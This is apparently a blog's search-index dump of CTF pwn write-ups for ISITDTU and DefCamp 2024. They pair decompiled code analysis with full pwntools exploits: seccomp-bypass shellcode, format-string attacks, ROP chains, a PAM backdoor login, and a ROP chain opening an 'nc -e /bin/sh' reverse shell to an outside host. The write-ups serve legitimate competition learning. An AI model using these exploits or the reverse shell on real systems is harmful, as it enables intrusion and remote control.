[{"categories":["CTF"],"content":"I participated in ISITDTU 2024 CTF Qual as part of the Megaricano team. As you can see from my previous posts, The Megaricano team is made up of Raon Secure Core Research Team members. Anyway, I focused on Pwn challenge. Here is All pwn chal write-up. Pwn ","date":"2024-10-27","objectID":"/isitdtuctf2024_qual/:0:0","tags":["Pwn","Write-Up"],"title":"Isitdtuctf2024_qual","uri":"/isitdtuctf2024_qual/"},{"categories":["CTF"],"content":"shellcode 1 ","date":"2024-10-27","objectID":"/isitdtuctf2024_qual/:1:0","tags":["Pwn","Write-Up"],"title":"Isitdtuctf2024_qual","uri":"/isitdtuctf2024_qual/"},{"categories":["CTF"],"content":"Analysis It‚Äôa Shellcoding Challenge with a seccomp filter. # line CODE JT JF K # ================================= # 0000: 0x20 0x00 0x00 0x00000004 A = arch # 0001: 0x15 0x00 0x0a 0xc000003e if (A != ARCH_X86_64) goto 0012 # 0002: 0x20 0x00 0x00 0x00000000 A = sys_number # 0003: 0x35 0x00 0x01 0x40000000 if (A \u003c 0x40000000) goto 0005 # 0004: 0x15 0x00 0x07 0xffffffff if (A != 0xffffffff) goto 0012 # 0005: 0x15 0x06 0x00 0x00000000 if (A == read) goto 0012 # 0006: 0x15 0x05 0x00 0x00000001 if (A == write) goto 0012 # 0007: 0x15 0x04 0x00 0x00000002 if (A == open) goto 0012 # 0008: 0x15 0x03 0x00 0x0000003b if (A == execve) goto 0012 # 0009: 0x15 0x02 0x00 0x000000f0 if (A == mq_open) goto 0012 # 0010: 0x15 0x01 0x00 0x00000101 if (A == openat) goto 0012 # 0011: 0x06 0x00 0x00 0x7fff0000 return ALLOW # 0012: 0x06 0x00 0x00 0x00000000 return KILL open, read, write, execve syscall is blocked. However, this can be easily bypassed with the preadv2, pwritev2 syscalls. Analyze the Challenge binary, you can see that it reads the contents from the flag file and copies them to the memory allocated with mmap. After that, it allocates executable memory again with mmap, copies the user‚Äôs shellcode, and executes it. Since the memory area where the flag contents are stored is adjacent, I gave a huge number as an argument to pwritev2 and was able to obtain the flag from the output. ","date":"2024-10-27","objectID":"/isitdtuctf2024_qual/:1:1","tags":["Pwn","Write-Up"],"title":"Isitdtuctf2024_qual","uri":"/isitdtuctf2024_qual/"},{"categories":["CTF"],"content":"Exploit from pwn import * context.arch = 'amd64' context.os = 'linux' context.terminal = ['tmux', 'splitw', '-h'] # p = process(\"./challenge\") p = remote(\"152.69.210.130\", 3001) p.recvuntil(b\": \") libc_base = int(p.recvline().strip(),16) - 0x606f0 # need to change? log.info(f\"libc_base: {hex(libc_base)}\") sc = ''' mov rax, 0x147 mov rdi, 3 mov r10, rdx mov rdx, 0x1 mov [rsi], rdx addq [rsi], 0x8 mov [rsi+0x8], r10 addq [rsi+0x8], 0x18 movq [rsi+0x10], 0x10000 add rsi, 0x8 mov r10, 0 mov r8, 0 mov r9, 0 syscall mov rax, 0x148 mov rdi, 0x1 mov rdx, 0x1 mov r10, -1 mov r8, -1 syscall ''' sc = asm(sc) p.sendline(sc) p.interactive() flag ISITDTU{061e8c26e3cf9bfad4e22879994048c8257b17d8} ","date":"2024-10-27","objectID":"/isitdtuctf2024_qual/:1:2","tags":["Pwn","Write-Up"],"title":"Isitdtuctf2024_qual","uri":"/isitdtuctf2024_qual/"},{"categories":["CTF"],"content":"shellcode 2 ","date":"2024-10-27","objectID":"/isitdtuctf2024_qual/:2:0","tags":["Pwn","Write-Up"],"title":"Isitdtuctf2024_qual","uri":"/isitdtuctf2024_qual/"},{"categories":["CTF"],"content":"Analysis Another Shellcoding Challenge. But this time we have to input shellcode with odd number. int __fastcall main(int argc, const char **argv, const char **envp) { int i; // [rsp+Ch] [rbp-4h] init(argc, argv, envp); read_flag(); addr = mmap((void *)0xAABBCC00LL, 0x1000uLL, 7, 34, -1, 0LL); if ( addr == (void *)-1LL ) { perror(\"mmap\"); return 1; } else { puts(\"\u003e\"); read(0, addr, 0x1000uLL); for ( i = 0; i \u003c= 4095; ++i ) { if ( (*((_BYTE *)addr + i) \u0026 1) == 0 ) *((_BYTE *)addr + i) = -112; } ((void (*)(void))addr)(); return 0; } } It filter even number byte and make it to \\x90 byte which mean nop instruction. I searched and found a way to generate odd byte shellcode via r11d register and was able to solve it by calculating the location of flag global variable via register and then calling write syscall. ","date":"2024-10-27","objectID":"/isitdtuctf2024_qual/:2:1","tags":["Pwn","Write-Up"],"title":"Isitdtuctf2024_qual","uri":"/isitdtuctf2024_qual/"},{"categories":["CTF"],"content":"Exploit from pwn import * # p = process('./challenge') p =remote('152.69.210.130', 3002) context.arch = 'amd64' context.terminal = ['tmux', 'splitw', '-h'] context.log_level = 'debug' # sleep(1) sc = ''' mov r11d, 0x13091309 shr r11, 15 shr r11, 1 sub r13, r11 mov r11d, 0xfffffff1 sub r11d, 0xffffbfb1 add r13, r11 push r13 mov r11d, 0xfffffff1 sub r11d, 0xffffd339 sub r13, r11 pop rdi call r13 ''' sc = asm(sc) # gdb.attach(p, ''' # brva 0x13fd # ''') p.sendline(sc) p.interactive() flag ISITDTU{95acf3a6b3e1afc243fbad70fbd60a6be00541c62c6d651d1c10179b41113bda} ","date":"2024-10-27","objectID":"/isitdtuctf2024_qual/:2:2","tags":["Pwn","Write-Up"],"title":"Isitdtuctf2024_qual","uri":"/isitdtuctf2024_qual/"},{"categories":["CTF"],"content":"Game of Luck ","date":"2024-10-27","objectID":"/isitdtuctf2024_qual/:3:0","tags":["Pwn","Write-Up"],"title":"Isitdtuctf2024_qual","uri":"/isitdtuctf2024_qual/"},{"categories":["CTF"],"content":"Analysis void __noreturn main_logic() { unsigned int v0; // [rsp+4h] [rbp-Ch] BYREF unsigned __int64 v1; // [rsp+8h] [rbp-8h] v1 = __readfsqword(0x28u); while ( 1 ) { while ( 1 ) { printf(\"Score: %u points\\n\", my_point); puts(\"0. Lucky Number\\n1. Play\\n2. Exit\"); __isoc99_scanf(\"%1u\", \u0026v0); while ( getchar() != '\\n' ) ; if ( v0 != 68 ) break; vuln(); } if ( v0 \u003e 'D' ) goto LABEL_13; if ( v0 == 2 ) { puts(\"Goodbye!\"); exit(0); } if ( v0 \u003e 2 ) { LABEL_13: puts(\"Invalid option!\"); } else if ( v0 ) { check_input(); } else { print_lucky(); } } } It‚Äôs a Random guess game challenge. __int64 check_input() { unsigned int v0; // eax int v2; // [rsp+8h] [rbp-8h] v0 = clock(); srand(v0); v2 = rand(); printf(\"Enter your guess: \"); if ( (unsigned int)sub_4013BB() != v2 ) { puts(\"Incorrect!\"); exit(0); } puts(\"Correct!\"); if ( ++my_point == 10 ) { vuln(); exit(0); } return 0LL; } Challenge binary set the rand seed through the return value of the clock() function and check the return value of the rand function and user input. __int64 vuln() { char buf[264]; // [rsp+0h] [rbp-110h] BYREF unsigned __int64 v2; // [rsp+108h] [rbp-8h] v2 = __readfsqword(0x28u); printf(\"Enter your name: \"); read(0, buf, 216uLL); printf(buf, (unsigned int)my_point); // fsb!! return 0LL; } In vuln() function you can cleary see fsb. Looking at this logic, it seems like the vulnerability should be triggered by playing the game. But if you look closely at the main_logic, there is no need to perform this game. while ( getchar() != '\\n' ) ; if ( v0 != 68 ) break; vuln(); In main_logic, user input is checked, and if it is 68, the vuln function is executed. However, we cannot input 68 through input, and before the main_logic function is executed, lucky_number is selected once, and 68 should come out here. And if we give input other than ‚Äú0,1,2‚Äù, 68 will be checked as it is, and the vuln function can be called. Leak the libc address and the stack address of ret through fsb, and then trigger fsb again to get a shell with one_gadget. ","date":"2024-10-27","objectID":"/isitdtuctf2024_qual/:3:1","tags":["Pwn","Write-Up"],"title":"Isitdtuctf2024_qual","uri":"/isitdtuctf2024_qual/"},{"categories":["CTF"],"content":"Exploit from pwn import * from ctypes import * context.log_level = \"debug\" context.terminal = [\"tmux\", \"splitw\", \"-h\"] context.bits = 64 libc = CDLL(\"./libc.so.6\") while True: # p = process(\"./chal\", env={\"LD_PRELOAD\":\"./libc.so.6\"}) p = remote('152.69.210.130', 2004) p.recvuntil(b': ') lucky_number = int(p.recvline().strip()) if lucky_number == 68: break else: p.close() # gdb.attach(p, ''' # b *0x401596 # ''') p.sendline(b'a') p.sendlineafter(b':', b'%3$p_%5$p') p.recvuntil(b'0x') libc_base = int(p.recvuntil(b'_', drop=True), 16) - 0x1147e2 log.info(f\"libc: {hex(libc_base)}\") stack_leak = int(p.recvuntil(b'\\n', drop=True), 16) ret_addr = stack_leak + 0x2281 log.info(f\"ret_addr: {hex(ret_addr)}\") og = libc_base + 0xebc85 fsb_payload = fmtstr_payload(6, {ret_addr: og}, write_size='short') p.sendline(b'a') p.sendlineafter(b':', fsb_payload) p.interactive() flag ISITDTU{a0e1948f76e189794b7377d8e3b585bfa99d7ed0de7e6a6ff01c2fd95bdf3f72} ","date":"2024-10-27","objectID":"/isitdtuctf2024_qual/:3:2","tags":["Pwn","Write-Up"],"title":"Isitdtuctf2024_qual","uri":"/isitdtuctf2024_qual/"},{"categories":["CTF"],"content":"no_name When I first opened the challenge file, I was a little scared because there was a qemu source code patch file and a git command in the Dockerfile to revert qemu to an older version, so I thought it was a qemu escape challenge. But it was just a patch to apply ASLR in qemu, so it was just an aarch64 exploit challenge.üòÖ ","date":"2024-10-27","objectID":"/isitdtuctf2024_qual/:4:0","tags":["Pwn","Write-Up"],"title":"Isitdtuctf2024_qual","uri":"/isitdtuctf2024_qual/"},{"categories":["CTF"],"content":"Analysis void *main_logic() { unsigned int v0; // w0 int input; // [xsp+18h] [xbp+18h] BYREF int flag; // [xsp+1Ch] [xbp+1Ch] int i; // [xsp+20h] [xbp+20h] int v5; // [xsp+24h] [xbp+24h] flag = 0; v0 = time(0LL); srand(v0); v5 = rand() % 10000 + 1; puts(\"=== Secret Number Quest ===\"); puts(\"Your mission: Guess the secret number (between 1 and 10000):\"); for ( i = 5; i \u003e 0; --i ) { printf(\"You have %d attempts left\\nEnter your guess: \", i); __isoc99_scanf(\"%d\", \u0026input); if ( v5 == input ) { puts(\"Huzzah! You've guessed correctly!\"); flag = 1; break; } if ( v5 \u003c= input ) puts(\"Too high! Beware of the dragon's fire!\"); else puts(\"Too low! The spirits are not pleased!\"); } if ( flag == 1 ) challenge(); else printf(\"Game over! The secret number was %d. The quest continues...\\n\", v5); return \u0026_stack_chk_guard; } Another random guess..! pls stop this..ü•≤ It‚Äôs so annoying to perform debugging.. Anyway binary architecture is aarch64, we have to debug it with gdb-multiarch and qemu-user-static You will also need to install libc6-arm64-cross to match library dependencies. However, since there is an inevitable time difference between running the exploit code and gdb-multiarch, I skipped the test by setting a breakpoint at the random check logic and modifying the register value. void *challenge() { int v1; // [xsp+18h] [xbp+18h] char buf[72]; // [xsp+20h] [xbp+20h] BYREF v1 = 0; puts(\"=== Magic Rune Challenge ===\"); puts(\"Your quest: Change the mystical value of 'check' to 0xdeadbeef!\"); fflush(stdout); while ( v1 \u003c= 1 ) { printf(\"Input a magic string to cast your spell: \"); read(0, buf, 64uLL); buf[strcspn(buf, \"\\n\")] = 0; printf(buf); // fsb!! putchar(10); printf(\"Alas! Your magic failed. 'check' is still 0x%08x.\\n\", 0x4030201); ++v1; } return \u0026_stack_chk_guard; } When you guess a random number and goto another challenge function, there is a logic like the above. You must change the check variable on the stack to the value 0xdeadbeef through fsb. Since we have 2 chances to trigger fsb, we can just leak all the values(stack, libc, canary) ‚Äã‚Äãwe need in the first one and write the values ‚Äã‚Äãto the stack address in the second one. And in the above function, it calls a function that can trigger bof by changing the check variable on the stack to 0xdeadbeef, although it is hidden due to IDA's optimization.ü§î .text:0000000000000D0C LDR W1, [SP,#0x70+check] .text:0000000000000D10 MOV W0, #0xDEADBEEF .text:0000000000000D18 CMP W1, W0 .text:0000000000000D1C B.NE loc_D28 .text:0000000000000D20 BL trigger_bof void *trigger_bof() { _BYTE buf[128]; // [xsp+18h] [xbp+18h] BYREF puts(\"You've successfully deciphered the ancient runes!\"); puts(\"Congratulations, brave adventurer! You've unlocked the secret treasure!\"); printf(\"Give me your name: \"); fflush(stdout); read(0, buf, 0x400uLL); return \u0026_stack_chk_guard; } The challenge can be solved by performing ROP in this function using the information leaked in the previous step. ASLR isn‚Äôt a big problem since we can just leak all the addresses. ","date":"2024-10-27","objectID":"/isitdtuctf2024_qual/:4:1","tags":["Pwn","Write-Up"],"title":"Isitdtuctf2024_qual","uri":"/isitdtuctf2024_qual/"},{"categories":["CTF"],"content":"Exploit from pwn import * from ctypes import * context.log_level = \"debug\" context.terminal = [\"tmux\", \"splitw\", \"-h\"] context.arch = 'aarch64' context.bits = 64 # p = process(['qemu-aarch64-static', '-g', '1234' , '-L', '/usr/aarch64-linux-gnu', './chall']) # p = process(['qemu-aarch64-static', '-L', '/usr/aarch64-linux-gnu', './chall']) p = remote('152.69.210.130', 1337) libc = ELF('/usr/aarch64-linux-gnu/lib/libc.so.6') libc_handle = CDLL('libc.so.6') libc_handle.srand(libc_handle.time(0)) rand_val = libc_handle.rand() % 10000 + 1 p.sendlineafter(b': ', str(rand_val).encode()) # p.sendlineafter(b': ', b'a' * 8 + b'%p_' * 20) p.sendlineafter(b'spell:', b'%5$p_%27$p_%33$p') p.recvuntil(b'0x') stack_leak = int(p.recvuntil(b'_', drop=True), 16) log.info(f\"stack_leak: {hex(stack_leak)}\") canary = int(p.recvuntil(b'_', drop=True), 16) log.info(f\"canary: {hex(canary)}\") libc_base = int(p.recvuntil(b'\\n', drop=True), 16) - 0x274cc log.info(f\"libc_base: {hex(libc_base)}\") check = stack_leak + 0x26fb log.info(f\"check: {hex(check)}\") fsb_payload = fmtstr_payload(12, {check: 0xdeadbeef}, write_size='short') p.sendlineafter(b'spell:', fsb_payload) binsh = libc_base + libc.search(b'/bin/sh').__next__() log.info(f\"binsh: {hex(binsh)}\") system = libc_base + libc.symbols['system'] log.info(f\"system: {hex(system)}\") gadget1 = libc_base + 0x00000000000d20a4 # ldp x21, x30, [sp, #0x10] ; ldp x19, x20, [sp], #0x20 ; ret gadget2 = libc_base + 0x00000000000e33e0 # mov x0, x20 ; blr x21 payload = b'a' * 128 + p64(canary) + b'a' * 0x8 + p64(gadget1) + b'A' * 0x58 + p64(canary) + b'A' * 0x8 + p64(binsh) + p64(system) + p64(gadget2) p.sendlineafter(b'name:', payload) p.interactive() flag ISITDTU{a3728bf1d6fc2f1bcfec6d0b64bca566a5149f52} ","date":"2024-10-27","objectID":"/isitdtuctf2024_qual/:4:2","tags":["Pwn","Write-Up"],"title":"Isitdtuctf2024_qual","uri":"/isitdtuctf2024_qual/"},{"categories":["CTF"],"content":" DefCamp CTF 2024 Qual Scoreboard I participated in DefCamp CTF 2024 Qualifier as part of the SaturnX team. And our team took 7th place. The finals are limited to 15 places, so our team qualified for the finals in Romania!!üòÜü•≥ I focused on the pwnable challenges and solved all the pwnable challenges by myself within the competition time. Pwn ","date":"2024-10-05","objectID":"/defcampctfqual_2024/:0:0","tags":["Pwn","Write-Up"],"title":"DefCamp CTF 2024 Qual","uri":"/defcampctfqual_2024/"},{"categories":["CTF"],"content":"ftp-console(90 solves) Challenge Description We got a very strange ftp console? Can you retrive the flag? ","date":"2024-10-05","objectID":"/defcampctfqual_2024/:1:0","tags":["Pwn","Write-Up"],"title":"DefCamp CTF 2024 Qual","uri":"/defcampctfqual_2024/"},{"categories":["CTF"],"content":"Analysis When opening the binary through IDA, there was a clear stack buffer overflow vulnerability. There was also a leak vulnerability because the address of the system function was printed. Since it was a 32-bit binary, 32-bit ROP was performed. Since the server‚Äôs libc and the local libc versions were the same, there was no need to match the libc versions separately! int login(void) { char overflow_buf[32]; // [esp+Ch] [ebp-4Ch] BYREF char username[32]; // [esp+2Ch] [ebp-2Ch] BYREF int v3; // [esp+4Ch] [ebp-Ch] v3 = 0; puts(\"220 FTP Service Ready\"); printf(\"USER \"); fgets(username, 32, stdin); username[strcspn(username, \"\\n\")] = 0; puts(\"331 Username okay, need password.\"); printf(\"[DEBUG] Password buffer is located at: %lp\\n\", \u0026system); printf(\"PASS \"); fgets(overflow_buf, 0x64, stdin); if ( !strcmp(username, \"admin\") \u0026\u0026 !strcmp(overflow_buf, \"password123\\n\") ) v3 = 1; if ( v3 ) return puts(\"230 User logged in, proceed.\"); else return puts(\"530 Login incorrect.\"); } ","date":"2024-10-05","objectID":"/defcampctfqual_2024/:1:1","tags":["Pwn","Write-Up"],"title":"DefCamp CTF 2024 Qual","uri":"/defcampctfqual_2024/"},{"categories":["CTF"],"content":"Solve There is nothing to explain. Just ROP. from pwn import * # p = process('./ftp_server') p = remote('35.246.220.107', 31125) e = ELF('./ftp_server') libc = ELF('./libc.so.6') context.log_level = 'debug' context.terminal = ['tmux', 'splitw', '-h'] context.arch = 'i386' p.sendline(b'a') p.recvuntil(b'at: ') leak = int(p.recvline().strip(), 16) libc_base = leak - 0x48170 log.info(f'leak: {hex(leak)}') log.info(f'libc_base: {hex(libc_base)}') # gdb.attach(p, ''' # b *0x80492EB # ''') og = libc_base + 0x172952 binsh = next(libc.search(b'/bin/sh')) + libc_base pop_edi_ret = libc_base + 0x00021e78 pay = b'a'*0x50 pay += p32(leak) pay += p32(pop_edi_ret) pay += p32(binsh) p.sendline(pay) p.interactive() flag CTF{c7160e6e316920f7c02d1d6eb228f0d7f2fb836bb0db2fb11eaf43577c91b691} ","date":"2024-10-05","objectID":"/defcampctfqual_2024/:1:2","tags":["Pwn","Write-Up"],"title":"DefCamp CTF 2024 Qual","uri":"/defcampctfqual_2024/"},{"categories":["CTF"],"content":"buy-cooffe(89 solves) Challenge Description It‚Äôs early morning, and the caffeine hasn‚Äôt quite kicked in yet. As you sip your cup of coffee, you notice something odd ‚Äì a mysterious program named cooffee is running on your system. ","date":"2024-10-05","objectID":"/defcampctfqual_2024/:2:0","tags":["Pwn","Write-Up"],"title":"DefCamp CTF 2024 Qual","uri":"/defcampctfqual_2024/"},{"categories":["CTF"],"content":"Analysis The binary for this challenge had a clear format string bug and stack overflow vulnerability. There was also a leak vulnerability because the address of the printf function was printed. unsigned __int64 coffee() { char format[24]; // [rsp+0h] [rbp-20h] BYREF unsigned __int64 v2; // [rsp+18h] [rbp-8h] v2 = __readfsqword(0x28u); printf(\"Coffee Time\\n$ \"); gets(format); printf(format); printf(\"What is this? %p\\n\", \u0026printf); printf(\"\\nCoffee Time\\n$ \"); fread(format, 1uLL, 0x50uLL, stdin); puts(format); return __readfsqword(0x28u) ^ v2; } ","date":"2024-10-05","objectID":"/defcampctfqual_2024/:2:1","tags":["Pwn","Write-Up"],"title":"DefCamp CTF 2024 Qual","uri":"/defcampctfqual_2024/"},{"categories":["CTF"],"content":"Solve This binary have stack canary. I use FSB to leak canary. And just ROP. from pwn import * # p = process(\"./chall\", env={\"LD_PRELOAD\":\"./libc-2.31.so\"}) p = remote('34.159.64.109', 32324) e = ELF(\"./chall\") context.log_level = 'debug' context.terminal = ['tmux', 'splitw', '-h'] p.sendline(b'%9$p') p.recvuntil(b'$ ') canary = int(p.recvuntil(b'W').strip(b'W'), 16) log.info(f'canary: {hex(canary)}') p.recvuntil(b'? ') leak = int(p.recvline().strip(), 16) log.info(f'leak: {hex(leak)}') libc_base = leak - 0x61c90 log.info(f'libc_base: {hex(libc_base)}') # gdb.attach(p) og = libc_base + 0xe3b01 pay = b'a' * 0x18 pay += p64(canary) pay += b'a' * 8 pay += p64(og) pay += b'a' * (0x50 - len(pay)) p.sendlineafter(b'$', pay) p.interactive() flag CTF{b5d4efc30c05420acb161eb92e120a902187d9710b297fba36d42528ea4ae09d} ","date":"2024-10-05","objectID":"/defcampctfqual_2024/:2:2","tags":["Pwn","Write-Up"],"title":"DefCamp CTF 2024 Qual","uri":"/defcampctfqual_2024/"},{"categories":["CTF"],"content":"aptssh(41 solves) Challenge Description Someone backdoored us with a strange PAM module, and now anyone can log in with aptssh:aptssh. I think they were able to get our flag. ","date":"2024-10-05","objectID":"/defcampctfqual_2024/:3:0","tags":["Pwn","Write-Up"],"title":"DefCamp CTF 2024 Qual","uri":"/defcampctfqual_2024/"},{"categories":["CTF"],"content":"Analysis There was no binary for the challenge. After starting the challenge instance and connecting via ssh with the provided username and password, two base64 encoded binaries were provided. One binary was the linked binary and one was the object file before linking. Since the two operate in the same way, I will explain them as a single binary. In the challenge description, it said that someone installed a backdoor via a suspicious PAM module. So I started analyzing it after thinking that this was that PAM module. int __fastcall pam_sm_authenticate(__int64 a1, __m128 _XMM0) { int result; // eax ... char *username; // [rsp+18h] [rbp-110h] char *authtok; // [rsp+20h] [rbp-108h] MAPDST BYREF char s2[8]; // [rsp+28h] [rbp-100h] BYREF char s[16]; // [rsp+30h] [rbp-F8h] BYREF int v23; // [rsp+90h] [rbp-98h] rand(); __asm { vpxor xmm0, xmm0, xmm0 } v23 = 0; __asm { vmovdqa xmmword ptr [rsp+128h+s], xmm0 vmovdqa [rsp+128h+var_E8], xmm0 vmovdqa [rsp+128h+var_D8], xmm0 vmovdqa [rsp+128h+var_C8], xmm0 vmovdqa [rsp+128h+var_B8], xmm0 vmovdqa [rsp+128h+var_A8], xmm0 } if ( dfgebrycw() ) { v4 = 10000; do v4 -= 8; while ( v4 ); return 10; } if ( (unsigned int)pam_get_user() ) return 10; if ( (unsigned int)pam_get_authtok(a1, 6LL, \u0026authtok, 0LL) || dfgebrycw() ) return 7; send_debug_message(); if ( !strcmp(authtok, \"aptssh\") ) { if ( !strcmp(username, \"aptssh\") ) { output_base64_file(a1, \"/lib/security/pam_passfile.so\"); output_base64_file(a1, \"/pam_passfile.o\"); return 0; } return 10; } if ( ierubvhcjsx() ) return 10; if ( dfgebrycw() ) return 7; pam_casual_auth(\u0026v13); if ( strlen(authtok) \u003e 0x64 ) { v5 = 7000; do v5 -= 8; while ( v5 ); *(_DWORD *)s2 = 0xADC29EC3; *(_WORD *)\u0026s2[6] = 0xAFC3; *(_WORD *)\u0026s2[4] = v13; // 0xBEC2 s[0] = 0; result = memcmp(authtok + 0x64, s2, 9uLL); if ( !result ) { v10 = 0x2710; do v10 -= 8; while ( v10 ); return result; } } if ( ierubvhcjsx() ) return 10; __strcpy_chk(); if ( strcmp(username, \"sshuser\") ) { v11 = 10000; do v11 -= 8; while ( v11 ); return 10; } v6 = fopen(\"/home/sshuser/pass.txt\", \"r\"); v7 = v6; if ( !v6 ) return 7; if ( !fgets(s, 0x64, v6) ) { fclose(v7); v12 = 10000; do v12 -= 8; while ( v12 ); return 7; } fclose(v7); v8 = strcspn(s, \"\\n\"); s[v8] = 0; result = strcmp(authtok, s); if ( result ) return 7; return result; } I was able to find the core logic in the pam_sm_authenticate function, and through it I was able to see that it performs user authentication when connecting to ssh. ","date":"2024-10-05","objectID":"/defcampctfqual_2024/:3:1","tags":["Pwn","Write-Up"],"title":"DefCamp CTF 2024 Qual","uri":"/defcampctfqual_2024/"},{"categories":["CTF"],"content":"Solve If you look closely at the logic of the above pseudo code, you can see that authentication can be done with another user (sshuser). There is also one more suspicious logic. if ( strlen(authtok) \u003e 0x64 ) { v5 = 7000; do v5 -= 8; while ( v5 ); *(_DWORD *)s2 = 0xADC29EC3; *(_WORD *)\u0026s2[6] = 0xAFC3; *(_WORD *)\u0026s2[4] = v13; // 0xBEC2 s[0] = 0; result = memcmp(authtok + 0x64, s2, 9uLL); if ( !result ) { v10 = 0x2710; do v10 -= 8; while ( v10 ); return result; } } This is the logic right above. When the length of the password is 0x64 or more, you can see that the authentication is performed by comparing the 8 bytes (excluding null bytes) that follow if they are the same. Through this backdoor logic, you can log in as sshuser. from pwn import * context.log_level = 'debug' passwd = b'A'*0x64 + b'\\xc3\\x9e\\xc2\\xad\\xc2\\xbe\\xc3\\xaf' # passwd = b'A' * 0x64 r = ssh(host='34.107.71.117', user='sshuser', password=passwd, port=31689, raw=True) print(r['cat flag.txt']) flag ctf{ba1e7756b2a842641357e840b47a477924b8deb0078e715754247453abb587be} ","date":"2024-10-05","objectID":"/defcampctfqual_2024/:3:2","tags":["Pwn","Write-Up"],"title":"DefCamp CTF 2024 Qual","uri":"/defcampctfqual_2024/"},{"categories":["CTF"],"content":"super-notes(19 solves) Challenge Description Here‚Äôs my note taking app! If you manage to crash the application make sure to wait 2-3minutes for it to restart. You don‚Äôt have to restart the task. ","date":"2024-10-05","objectID":"/defcampctfqual_2024/:4:0","tags":["Pwn","Write-Up"],"title":"DefCamp CTF 2024 Qual","uri":"/defcampctfqual_2024/"},{"categories":["CTF"],"content":"Analysis This challenge was a Web + Pwnable challenge and took the longest to solve. The binary was stripped and statically compiled, so it took a long time to analyze. However, because the vulnerability was simple, it didn‚Äôt take long to find it. There was a part that added notes written in binary to an HTML file, and as I continued to add notes, the contents of the notes continued to be added to the HTML file, causing an overflow. However, the size of the content that could be added to a note was limited to 0x20, and it was difficult to perform ROP with only the content of the note. ","date":"2024-10-05","objectID":"/defcampctfqual_2024/:4:1","tags":["Pwn","Write-Up"],"title":"DefCamp CTF 2024 Qual","uri":"/defcampctfqual_2024/"},{"categories":["CTF"],"content":"Solve There was also one more obstacle: when sending an HTTP request, bytes like null bytes or \\x2b were all url-encoded, making it difficult to write the payload. I struggled a lot here. However, if you look closely at the binary again, there was logic to replace these bytes. for ( j = 0; j \u003c v6; ++j ) { if ( *(_BYTE *)(*(_QWORD *)(qword_4D4578 + 8LL * i) + j) == 0x2B ) { *(_BYTE *)(*(_QWORD *)(qword_4D4578 + 8LL * i) + j) = ' '; } else if ( *(_BYTE *)(*(_QWORD *)(qword_4D4578 + 8LL * i) + j) == '0' ) { *(_BYTE *)(*(_QWORD *)(qword_4D4578 + 8LL * i) + j) = 0; } } With the help of the above logic, I was able to write the payload. There were username and password variables on the global variable side, and I could input 0xff here. Therefore, I wrote a ROP chain on the username and was able to overwrite rbp through the overflow vulnerability, and through this, I performed a stack pivot and executed the ROP chain on the username side. However, for these Web + Pwn challenges, you can‚Äôt just run the shell, you have to get the flag through reverse shell. This is where I wasted a lot of time. I tried to open the reverse shell through execve syscall, but something didn‚Äôt work properly in the process of passing the arguments. Also, here‚Äôs a funny thing, to open a reverse shell, the domain name must not contain 0, and the port number must not contain 0 either. This is because the input is weird due to url encoding! lol At that time, I had not set up a domain name on the my Vultr server, so I borrowed another team member‚Äôs server and wrote an exploit! import requests from pwn import * import string from urllib import parse host = b'34.107.93.11' port = 32650 url = b\"http://34.107.93.11:32650\" # host = b'localhost' # port = 1339 # url = b\"http://localhost:1339\" username_rop = b'\\x10\\30\\x4d00000' # RBP # START ROP # 0x0000000000452a17 username_rop += b'\\x17\\x2a\\x4500000' # POP RAX; RET username_rop += b'\\x3b0000000' # execve syscall number # 0x0000000000402c8f : pop rdi ; ret username_rop += b'\\x8f\\x2c\\x4000000' # POP RDI; RET username_rop += b'\\x50\\x22\\x4d00000' # /bin/sh # 0x000000000040acfe : pop rsi ; ret username_rop += b'\\xfe\\xac\\x4000000' # POP RSI; RET username_rop += b'\\x20\\x22\\x4d00000' # NULL # 0x00000000004898eb : pop rdx ; pop rbx ; ret username_rop += b'\\xeb\\x98\\x4800000' # POP RDX; POP RBX; RET username_rop += b'\\xa0\\x22\\x4d00000' # NULL username_rop += b'\\xa0\\x22\\x4d00000' # NULL # 0x0000000000402a44 : syscall username_rop += b'\\x44\\x2a\\x4000000' # SYSCALL username_rop += b'a'*0x10 context.log_level = 'debug' register = b'''POST /login HTTP/1.1\\r Host: 34.107.93.11:32462\\r username=%b\u0026password=%b''' % (b'caca',b'caca') p = remote(host, port) p.send(register) p.close() passwd = b'\\x50\\x22\\x4d00000' # /bin/nc passwd += b'\\x58\\x22\\x4d00000' # choiys.kr passwd += b'\\x62\\x22\\x4d00000' # 1234 passwd += b'\\x67\\x22\\x4d00000' # -e passwd += b'\\x6a\\x22\\x4d00000' # /bin/sh passwd += b'00000000' passwd += b'/bin/nc0' passwd += b'choiys.kr0' passwd += b'12340' passwd += b'-e0' passwd += b'/bin/sh0' user_info = { \"username\" : username_rop, \"password\" : passwd, } log.info(f\"username : {user_info['username']}\") log.info(f\"password : {user_info['password']}\") register = b'''POST /register HTTP/1.1\\r Host: 34.107.93.11:32462\\r username=%b\u0026password=%b''' % (user_info['username'], user_info['password']) p = remote(host, port) p.send(register) p.close() def add_note(data, debug=False): # assert len(data) \u003c= 0x20 res = requests.post(url+b'/add_note', data={'note_content': data}) if res.status_code == 200: log.info(f'add_note : {data}') if debug: print(res.request.headers) print(res.text) def delete_note(idx): res = requests.post(url+b'/delete_note\u0026index=' + idx) if res.status_code == 200: log.info(f'delete_note {idx} : {res.status_code}') # add_note(b'A' * 0x20) for i in range(49): add_note(b'B' * 0x20) pay = b'''POST /add_note HTTP/1.1\\r\\nHost: localhost:1339\\r\\nUser-Agent: python-requests/2.32.3\\r\\nAccept-Encoding: gzip, deflate, zstd\\r\\nAccept","date":"2024-10-05","objectID":"/defcampctfqual_2024/:4:2","tags":["Pwn","Write-Up"],"title":"DefCamp CTF 2024 Qual","uri":"/defcampctfqual_2024/"},{"categories":["CTF"],"content":"Conclusion Having successfully completed this DefCamp 2024 CTF qual, I am participating in the overseas CTF finals offline for the first time! The finals will be held in the Attack \u0026 Defense format, so I am really looking forward to it! See you in Romania! ","date":"2024-10-05","objectID":"/defcampctfqual_2024/:5:0","tags":["Pwn","Write-Up"],"title":"DefCamp CTF 2024 Qual","uri":"/defcampctfqual_2024/"},{"categories":["CTF"],"content":" WxMCTF 2024 Scoreboard I participated in WxMCTF 2024 as part of the Megaricano team. And our team took second place. The Megaricano team is made up of Raon Secure Core Research Team members. Pwn ","date":"2024-04-07","objectID":"/wxmctf_2024/:0:0","tags":["Pwn","Write-Up"],"title":"WxMCTF 2024","uri":"/wxmctf_2024/"},{"categories":["CTF"],"content":"Moodle Madness Challenge Description It recently came to light from an anonymous source that ‚ÄúMoodle,‚Äù the math assignment program made famous by Ms. Gugoiu, has an exploit to see the answers to questions. 